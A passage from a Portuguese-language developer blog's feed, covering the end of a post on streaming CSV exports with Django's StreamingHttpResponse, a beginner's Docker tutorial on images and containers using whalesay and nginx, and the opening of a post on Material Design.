        &lt;span class="n"&gt;cargoes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Cargoes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter_by_request_parms&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="c1"&gt;# Usamos a mesma interface de buffer utilizada para escrever&lt;/span&gt;
        &lt;span class="c1"&gt;# um arquivo. No entanto, apenas damos um `return value`&lt;/span&gt;
        &lt;span class="c1"&gt;# aos inves de persistirmos o valor&lt;/span&gt;
        &lt;span class="n"&gt;pseudo_buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Echo&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;writer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;csv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;writer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pseudo_buffer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="c1"&gt;# Construimos o nosso gerador&lt;/span&gt;
        &lt;span class="n"&gt;gen_func&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;writer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;writerow&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;row&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;row&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;cargos&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;values_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;commodity&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;weight&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

        &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;StreamingHttpResponse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gen_func&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;content_type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;text/csv&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-Disposition&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;attachment;filename=&amp;quot;filtered_cargoes.csv&amp;quot;&amp;#39;&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Antes mesmo de termos todo o &lt;em&gt;CSV&lt;/em&gt; montado, já estamos retornando dados ao usuário.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://docs.djangoproject.com/en/1.11/howto/outputting-csv/#streaming-large-csv-files" title="Leia mais na documentação do Django"&gt;Veja o exemplo da documentação ofical do &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;É a melhor maneira de resolver esse problema?&lt;/h2&gt;
&lt;p&gt;Caso a sua única opção seja retornar o dado através de uma &lt;em&gt;view&lt;/em&gt; &lt;em&gt;Django&lt;/em&gt;, sim. Além
de um uso mais eficiente de memória, o retorno do &lt;code&gt;StreamingHttpResponse&lt;/code&gt;
vai impedir que, por exemplo, um &lt;em&gt;load balancer&lt;/em&gt; feche a conexão do seu usuário pelo
fato de o serviço &lt;em&gt;Django&lt;/em&gt; estar levando muito tempo para montar a resposta.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/biznis-cat.png" width="610" height="259" title="O Django com StreamingHttpResponse fica mais biznis (thelegomovie.wikia.com)" alt="O Django com StreamingHttpResponse fica mais biznis (thelegomovie.wikia.com)"&gt;&lt;/p&gt;
&lt;p&gt;Mas segundo a recomendação da &lt;a href="https://docs.djangoproject.com/en/1.11/ref/request-response/#django.http.StreamingHttpResponse" title="Veja mais na documentação do Django"&gt;própria documentação&lt;/a&gt;
do &lt;code&gt;StreamingHttpResponse&lt;/code&gt;, já que essa é uma "operação bloqueante",
o ideal seria realizá-la em um &lt;em&gt;background job&lt;/em&gt; (por exemplo) e deixar com que o
usuário acesse essa informação quando ela já estiver pronta.&lt;/p&gt;
&lt;p&gt;O &lt;code&gt;django-report-builder&lt;/code&gt; entrega essa &lt;a href="https://django-report-builder.readthedocs.io/en/latest/quickstart/#asynchronous-report-generation" title="Leia mais na documentação da biblioteca"&gt;modalidade de "asynchronous reports"&lt;/a&gt;
através do &lt;a href="http://www.celeryproject.org/" title="Celery: Distributed Task Queue"&gt;&lt;em&gt;Celery&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;É fato que a "mágica pesada" fica no lado do &lt;a href="https://klauslaube.com.br/tag/wsgi.html" title="Leia mais sobre WSGI"&gt;&lt;em&gt;WSGI&lt;/em&gt;&lt;/a&gt;, como você pode ver &lt;a href="https://andrewbrookins.com/django/how-does-djangos-streaminghttpresponse-work-exactly/#the-wsgi-server" title="How does Django’s StreamingHttpResponse work, exactly?"&gt;aqui&lt;/a&gt;.
O &lt;em&gt;Django&lt;/em&gt; "faz o que pode" quando o assunto é lidar com grandes volumes de dados. Mas
o ideal é sempre deixar essa carga de processamento fora do ciclo de vida da requisição do usuário.&lt;/p&gt;
&lt;p&gt;Mesmo assim, o &lt;code&gt;StreamingHttpResponse&lt;/code&gt; vem como uma boa alternativa para resolver
alguns problemas de &lt;em&gt;views&lt;/em&gt; com tempos de resposta e consumo de recursos muito altos, podendo
ser a solução ideal para alguns relatórios que você emite em sua aplicação.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.aeguana.com/2015/12/12/csv-export-data-for-django-model/"&gt;&lt;em&gt;Aeguana - How to export data as a CSV – Django model&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://andrewbrookins.com/django/how-does-djangos-streaminghttpresponse-work-exactly/"&gt;&lt;em&gt;Andrew Brookins - How does Django's StreamingHttpResponse work, exactly?&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/1.11/ref/request-response/#streaminghttpresponse-objects"&gt;&lt;em&gt;Django Documentation - StreamingHttpResponse&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ericcarmichael.com/streaming-django-responses-on-heroku.html"&gt;&lt;em&gt;nerdery - Streaming Django responses on Heroku&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.rodvdka.co.za/heroku/long-polling/h12/h18/django/2016/10/13/long-polling-heroku.html"&gt;&lt;em&gt;rodvdka - Django long running report on Django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/33208849/python-django-streaming-video-mp4-file-using-httpresponse"&gt;&lt;em&gt;Stackoverflow - Streaming video/mp4 file using HttpResponse&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/1756096/understanding-generators-in-python"&gt;&lt;em&gt;Stackoverflow - Understanding Generators in Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="python"></category><category term="django"></category><category term="streaming"></category><category term="generators"></category><category term="wsgi"></category><category term="csv"></category></entry><entry><title>Uma ode ao Docker - Parte 2</title><link href="https://klauslaube.com.br/2017/05/01/uma-ode-ao-docker-parte-2.html" rel="alternate"></link><published>2017-05-01T22:25:00-03:00</published><updated>2017-05-01T22:25:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2017-05-01:/2017/05/01/uma-ode-ao-docker-parte-2.html</id><summary type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2017/01/14/uma-ode-ao-docker-parte-1.html" title="Uma ode ao Docker - Parte 1"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;
falamos sobre o &lt;em&gt;Docker&lt;/em&gt;, e arranhamos um pouco sobre a diferença entre
virtualização com &lt;em&gt;Hypervisor&lt;/em&gt; e &lt;em&gt;Container&lt;/em&gt;. Nesse &lt;em&gt;post&lt;/em&gt;,
vamos explorar um pouquinho mais alguns conceitos, mostrando como funciona essa
ferramenta que é sensação quando o assunto é &lt;em&gt;virtual machines&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Mas antes, vamos relembrar o que é …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2017/01/14/uma-ode-ao-docker-parte-1.html" title="Uma ode ao Docker - Parte 1"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;
falamos sobre o &lt;em&gt;Docker&lt;/em&gt;, e arranhamos um pouco sobre a diferença entre
virtualização com &lt;em&gt;Hypervisor&lt;/em&gt; e &lt;em&gt;Container&lt;/em&gt;. Nesse &lt;em&gt;post&lt;/em&gt;,
vamos explorar um pouquinho mais alguns conceitos, mostrando como funciona essa
ferramenta que é sensação quando o assunto é &lt;em&gt;virtual machines&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Mas antes, vamos relembrar o que é o &lt;em&gt;Docker&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;"Docker is an open platform for building, shipping and running distributed
applications. It gives programmers, development teams, and operations engineers
the common toolbox they need to take advantage of the distributed and networked
nature of modern applications."&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Em uma linguagem mais simples, &lt;em&gt;Docker&lt;/em&gt; lhe dá a habilidade de executar
aplicações dentro de um ambiente controlado, conhecido como &lt;em&gt;Container&lt;/em&gt;.
&lt;em&gt;Containers&lt;/em&gt; são similares às tradicionais máquinas virtuais, contudo, eles
compartilham o mesmo sistema operacional e provém um conjunto de comandos
que permitem a execução e controle da sua aplicação ou processo.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=pGYAg7TMmp0" title="Docker Tutorial - What is Docker &amp;amp; Docker Containers, Images, etc?"&gt;Veja a diferença entre &lt;em&gt;Vagrant&lt;/em&gt; e &lt;em&gt;Docker&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Instalando&lt;/h2&gt;
&lt;p&gt;Talvez você se depare com alguns artigos na &lt;em&gt;Internet&lt;/em&gt;, que ao falar sobre a
instalação do &lt;em&gt;Docker&lt;/em&gt;, também mencionem &lt;strong&gt;boot2docker&lt;/strong&gt; ou a necessidade do
&lt;strong&gt;docker-machine&lt;/strong&gt;. Houve um tempo onde utilizar &lt;em&gt;Docker&lt;/em&gt; em máquinas
&lt;em&gt;Windows&lt;/em&gt; ou &lt;em&gt;OSX&lt;/em&gt; não era tão trivial assim... mas esse tempo ficou para trás.&lt;/p&gt;
&lt;p&gt;Hoje, basta acessar a &lt;a href="https://www.docker.com/community-edition#/download" title="Baixe o Docker Community Edition"&gt;página de &lt;em&gt;download&lt;/em&gt;&lt;/a&gt;,
selecionar o seu sistema operacional, e seguir o passo a passo
(que geralmente consiste em uma série de "next-next-finish").&lt;/p&gt;
&lt;p&gt;&lt;a href="https://docs.docker.com/docker-for-mac/docker-toolbox/" title="Docker for Mac vs. Docker Toolbox"&gt;Entenda a diferença entre o Docker Toolbox e Docker for Mac&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Uma vez instalado, através do terminal execute o seguinte comando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker images

REPOSITORY   TAG   IMAGE  ID   CREATED   SIZE
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esse é o momento ideal para falarmos de outro conceito muito importante dentro
do &lt;em&gt;Docker&lt;/em&gt;: &lt;strong&gt;Images&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Imagens&lt;/h2&gt;
&lt;p&gt;Segundo a documentação oficial:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;An image is a lightweight, stand-alone, executable package that includes
everything needed to run a piece of software, including the code, a runtime,
libraries, environment variables, and config files.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ou seja, um &lt;em&gt;Docker Image&lt;/em&gt; é um binário que inclui todos os requisitos
necessários para rodar um &lt;em&gt;Container&lt;/em&gt;. Podemos pensar sobre esse
conceito como uma tecnologia para empacotamento (ou até mesmo como uma espécie &lt;em&gt;snapshot&lt;/em&gt;),
onde não só definimos nossa distribuição &lt;em&gt;Linux&lt;/em&gt; ou serviços utilizados
(como &lt;em&gt;Postgres&lt;/em&gt; ou &lt;em&gt;Nginx&lt;/em&gt;, por exemplo), como também adicionamos a nossa própria aplicação
ao pacote.&lt;/p&gt;
&lt;p&gt;Uma imagem é imutável, ou seja, &lt;em&gt;read only&lt;/em&gt;. Imagens
geralmente são compostas por outras camadas de imagens (&lt;em&gt;image layers&lt;/em&gt;). Isso é um
&lt;em&gt;approach&lt;/em&gt; interessante, já que uma vez que uma camada seja baixada ela não precisará ser
baixada novamente, mesmo se outras imagens utilizarem da mesma camada:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/docker-image-container.jpg" width="610" height="424" title="Esquema representando o Sistema de Arquivo (docs.docker.com)" alt="Esquema representando o Sistema de Arquivo (docs.docker.com)"&gt;&lt;/p&gt;
&lt;p&gt;Um &lt;em&gt;Docker Container&lt;/em&gt; em vias práticas é uma "instância" da imagem... é o que a imagem se torna em memória
ao ser executada. De forma preguiçosa, podemos fazer a analogia com a &lt;a href="https://klauslaube.com.br/tag/oop.html" title="Leia mais sobre OOP"&gt;Orientação a Objetos&lt;/a&gt;,
onde a imagem pode ser comparada com uma classe, e a instância com um &lt;em&gt;Container&lt;/em&gt;. Podemos ter
tantos &lt;em&gt;containers&lt;/em&gt; quanto necessário para uma mesma imagem.&lt;/p&gt;
&lt;h2&gt;Um pouco de prática&lt;/h2&gt;
&lt;p&gt;Vamos baixar a nossa primeira imagem &lt;em&gt;Docker&lt;/em&gt;. Para isso, execute o seguinte comando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker pull docker/whalesay
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O comando &lt;code&gt;docker pull&lt;/code&gt; fará o &lt;em&gt;download&lt;/em&gt; da imagem &lt;code&gt;docker/whalesay&lt;/code&gt;
para o seu computador. Essa imagem está hospedada (por padrão) no &lt;a href="https://hub.docker.com/r/docker/whalesay/"&gt;&lt;em&gt;Docker Hub&lt;/em&gt;&lt;/a&gt;,
uma espécie de "Github para imagens Docker".&lt;/p&gt;
&lt;p&gt;&lt;a href="https://hub.docker.com/" title="Docker Hub"&gt;Leia mais sobre o &lt;em&gt;Docker Hub&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;É possível visualizarmos a imagem através do comando &lt;code&gt;docker images&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker images

REPOSITORY         TAG       IMAGE ID        CREATED          SIZE
docker/whalesay    latest    6b362a9f73eb    &lt;span class="m"&gt;23&lt;/span&gt; months ago    &lt;span class="m"&gt;247&lt;/span&gt; MB
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;É uma prática comum o repositório/nome da imagem ser chamado de
&lt;code&gt;&amp;lt;repositório&amp;gt;/&amp;lt;nome de imagem&amp;gt;&lt;/code&gt;. Isso evita que haja duplicidade no &lt;em&gt;Docker Hub&lt;/em&gt;. Para
executar a imagem (e por consequência criar um &lt;em&gt;Container&lt;/em&gt;), temos o comando &lt;code&gt;docker run&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker run docker/whalesay cowsay boo
 _____
&amp;lt; boo &amp;gt;
 -----
    &lt;span class="se"&gt;\&lt;/span&gt;
     &lt;span class="se"&gt;\&lt;/span&gt;
      &lt;span class="se"&gt;\&lt;/span&gt;
                    &lt;span class="c1"&gt;##        .&lt;/span&gt;
              &lt;span class="c1"&gt;## ## ##       ==&lt;/span&gt;
           &lt;span class="c1"&gt;## ## ## ##      ===&lt;/span&gt;
       /&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;___/ &lt;span class="o"&gt;===&lt;/span&gt;
  ~~~ &lt;span class="o"&gt;{&lt;/span&gt;~~ ~~~~ ~~~ ~~~~ ~~ ~ /  &lt;span class="o"&gt;===&lt;/span&gt;- ~~~
       &lt;span class="se"&gt;\_&lt;/span&gt;_____ o          __/
        &lt;span class="se"&gt;\ &lt;/span&gt;   &lt;span class="se"&gt;\ &lt;/span&gt;       __/
          &lt;span class="se"&gt;\_&lt;/span&gt;___&lt;span class="se"&gt;\_&lt;/span&gt;_____/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Também é possível executarmos através do &lt;code&gt;ID&lt;/code&gt; da imagem:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker run 6b362a9f73eb cowsay boo2
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Welcome to Nginx!&lt;/h2&gt;
&lt;p&gt;É claro que o &lt;em&gt;Docker&lt;/em&gt; é muito mais poderoso do que isso. Por exemplo, vamos baixar o
&lt;a href="https://klauslaube.com.br/tag/nginx.html" title="Leia mais sobre o Nginx"&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/a&gt; e ver como podemos receber uma simpática tela de "It's working":&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker pull nginx
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Notou a ausência do &lt;code&gt;&amp;lt;repositório&amp;gt;/&lt;/code&gt;? Repositórios oficiais no &lt;em&gt;Docker Hub&lt;/em&gt; não necessitam
de um prefixo, e você pode encontrá-los na interface &lt;em&gt;web&lt;/em&gt; através do &lt;em&gt;path&lt;/em&gt; &lt;code&gt;_/&amp;lt;nome da imagem&amp;gt;&lt;/code&gt;.
Por exemplo, o endereço do &lt;em&gt;Nginx&lt;/em&gt; no &lt;em&gt;Docker Hub&lt;/em&gt; é &lt;a href="https://hub.docker.com/_/nginx/"&gt;https://hub.docker.com/_/nginx/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/memento-docker.png" width="610" height="458" title="Assim como em Memento, o Docker também depende de imagens e tem memória curta (problemasfilosoficos.blogspot.com.br)" alt="Assim como em Memento, o Docker também depende de imagens e tem memória curta (problemasfilosoficos.blogspot.com.br)"&gt;&lt;/p&gt;
&lt;p&gt;Vamos executar o &lt;em&gt;Nginx&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker run -p &lt;span class="m"&gt;5000&lt;/span&gt;:80 nginx
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mapemos a porta &lt;code&gt;5000&lt;/code&gt; da nossa máquina para apontar para a porta &lt;code&gt;80&lt;/code&gt; do &lt;em&gt;Container&lt;/em&gt;. Logo, ao acessarmos
o &lt;code&gt;http://localhost:5000&lt;/code&gt;, recebemos a simpática tela de boas vindas ao &lt;em&gt;Nginx&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Podemos dar um nome ao processo, e ainda executá-lo em modo &lt;em&gt;daemon&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker run --name docker-nginx -p &lt;span class="m"&gt;5000&lt;/span&gt;:80 -d nginx

796ab2f0a662c045d0cfc99ff836a364a384406b8c6eaf03bcfb65e6cfd87751
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O valor de retorno é o &lt;em&gt;ID&lt;/em&gt; do &lt;em&gt;Container&lt;/em&gt;. Note a presença dos parâmetros &lt;code&gt;--name&lt;/code&gt; e &lt;code&gt;-d&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Para listar os &lt;em&gt;Containers&lt;/em&gt; ativos, usamos o comando &lt;code&gt;ps&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker ps

CONTAINER ID    IMAGE    COMMAND
796ab2f0a662    nginx    &lt;span class="s2"&gt;&amp;quot;nginx -g &amp;#39;daemon ...&amp;quot;&lt;/span&gt;
CREATED           STATUS           PORTS                  NAMES
&lt;span class="m"&gt;12&lt;/span&gt; seconds ago    Up &lt;span class="m"&gt;11&lt;/span&gt; seconds    &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:5000-&amp;gt;80/tcp   docker-nginx
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para parar o serviço:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker stop docker-nginx
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! Simples como as melhores coisas da vida.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Lembro até hoje do momento em que ouvi falar sobre &lt;em&gt;Docker&lt;/em&gt; pela primeira vez,
e me questionei: Onde é que eu encaixo a minha ferramenta de provisionamento?&lt;/p&gt;
&lt;p&gt;Pois bem, não se faz necessário ter uma ferramenta de provisionamento uma vez que a sua
aplicação seja empacotada em uma imagem &lt;em&gt;Docker&lt;/em&gt;. A forma de pensar no &lt;em&gt;deploy&lt;/em&gt; da
aplicação muda, uma vez que ela esteja "containerizada".&lt;/p&gt;
&lt;p&gt;No próximo &lt;em&gt;post&lt;/em&gt; da série vamos utilizar &lt;em&gt;Docker&lt;/em&gt; em uma aplicação &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;
e &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;, e nos deparar com
algumas peculiaridades de ambientes &lt;em&gt;Docker&lt;/em&gt; (como por exemplo, os ambiente efêmeros).&lt;/p&gt;
&lt;p&gt;Até a próxima!&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.docker.com/get-started/"&gt;&lt;em&gt;Docker Docs&lt;/em&gt; - &lt;em&gt;Get started, Part 1: Orientation and Setup&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.mundodocker.com.br/o-que-e-uma-imagem/"&gt;&lt;em&gt;MundoDocker&lt;/em&gt; - O que é uma imagem?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.openshift.com/enterprise/3.0/architecture/core_concepts/containers_and_images.html#docker-images"&gt;&lt;em&gt;Openshift&lt;/em&gt; - &lt;em&gt;Docker images&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://semaphoreci.com/community/tutorials/dockerizing-a-python-django-web-application"&gt;&lt;em&gt;Semaphore&lt;/em&gt; - &lt;em&gt;Dockerizing a Python Django web Application&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/23735149/docker-image-vs-container"&gt;&lt;em&gt;Stackoverflow&lt;/em&gt; - &lt;em&gt;Docker image vs container&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="infraestrutura"></category><category term="virtualizacao"></category><category term="containerizacao"></category><category term="docker"></category><category term="nginx"></category></entry><entry><title>Eu me rendo: Material Design</title><link href="https://klauslaube.com.br/2017/04/19/eu-me-rendo-material-design.html" rel="alternate"></link><published>2017-04-19T12:00:00-03:00</published><updated>2017-04-19T12:00:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2017-04-19:/2017/04/19/eu-me-rendo-material-design.html</id><summary type="html">&lt;p&gt;Lembro como se fosse hoje de um camarada dos tempos de &lt;em&gt;Globo.com&lt;/em&gt; me falando de
modo efusivo: Você deveria experimentar o &lt;em&gt;MaterializeCSS&lt;/em&gt;, vai te poupar muito
tempo e te entregar uma interface elegante; Na época eu estava munido da minha
ignorância, e acabei não seguindo o conselho do nobre …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Lembro como se fosse hoje de um camarada dos tempos de &lt;em&gt;Globo.com&lt;/em&gt; me falando de
modo efusivo: Você deveria experimentar o &lt;em&gt;MaterializeCSS&lt;/em&gt;, vai te poupar muito
tempo e te entregar uma interface elegante; Na época eu estava munido da minha
ignorância, e acabei não seguindo o conselho do nobre amigo.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Pouco tempo se passou, e entrei em um projeto muito importante da empresa. Nele,
houve um complexo trabalho por parte do time de estratégia e de &lt;em&gt;UX&lt;/em&gt; para determinar
a arquitetura da informação e &lt;em&gt;design&lt;/em&gt;. Imagine a minha surpresa quando descobri que o
&lt;em&gt;Material Design&lt;/em&gt; foi usado como base para uma série de decisões tomadas. Uma luz amarela
acendeu-se em minha cabeça, mas ainda não tinha sido o suficiente para saber mais.&lt;/p&gt;
&lt;p&gt;Finalmente, ao inscrever-me no &lt;a href="https://br.udacity.com/course/android-basics-nanodegree-by-google--nd803/" title="Android Basics"&gt;&lt;em&gt;Nanodegree&lt;/em&gt; de &lt;em&gt;Android&lt;/em&gt; do &lt;em&gt;Udacity&lt;/em&gt;&lt;/a&gt;,
que eu desisti e me rendi ao &lt;em&gt;Material Design&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;O Material Design&lt;/h2&gt;
&lt;p&gt;Diretamente do &lt;a href="http://material.io" title="Visite o site oficial"&gt;material.io&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Material Design is a unified system that combines theory, resources, and tools for crafting digital experiences.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Em uma definição mais descritiva, podemos dizer que o &lt;em&gt;Material Design&lt;/em&gt; é
uma completíssima "linguagem de design". Criado a partir de um profundo estudo de
&lt;em&gt;branding&lt;/em&gt;, &lt;em&gt;interaction&lt;/em&gt; e &lt;em&gt;motion&lt;/em&gt;, o &lt;em&gt;Material&lt;/em&gt; é uma compilação de estilos
e princípios que funcionam consistentemente em diferentes soluções.&lt;/p&gt;
&lt;p&gt;Com sua origem no universo &lt;em&gt;Mobile&lt;/em&gt; da &lt;em&gt;Google&lt;/em&gt;, a partir da versão 2.1 do
&lt;em&gt;Android&lt;/em&gt;, hoje é possível apreciarmos o &lt;em&gt;Material Design&lt;/em&gt; sendo utilizado
também em soluções &lt;em&gt;web&lt;/em&gt;. Existem duas bibliotecas bem-quistas em "traduzir"
a especificação para os &lt;em&gt;browsers&lt;/em&gt;: &lt;a href="http://materializecss.com/" title="Leia mais sobre o Materialize"&gt;&lt;em&gt;MaterializeCSS&lt;/em&gt;&lt;/a&gt;
e &lt;a href="https://getmdl.io/index.html" title="Leia mais sobre o MDL"&gt;&lt;em&gt;Material Design Lite&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;MaterializeCSS ou Material Design Lite?&lt;/h2&gt;
&lt;p&gt;Sem rodeios:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;MaterializeCSS&lt;/strong&gt;: Iniciativa &lt;em&gt;open source&lt;/em&gt;, com mais de 25 mil &lt;em&gt;stars&lt;/em&gt; no
